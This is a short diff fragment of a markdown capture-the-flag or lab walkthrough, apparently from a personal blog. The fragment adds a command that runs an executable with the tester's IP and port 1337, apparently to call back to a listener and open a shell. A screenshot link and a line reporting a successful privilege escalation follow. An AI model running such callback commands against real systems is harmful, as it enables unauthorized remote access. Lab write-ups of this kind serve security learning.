@@ -241,7 +241,13 @@ So we ought to specify our ip and the port  we plan on listening on. I'll up a n
 
 Running the executable again
 
-command:```
+command:```.\c.exe 10.10.14.142 1337```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4535aee3-b49e-4f3a-9757-9324a8d6aae4)
+
+We were able to successfully escalate our privileges
+
+
 
 
 
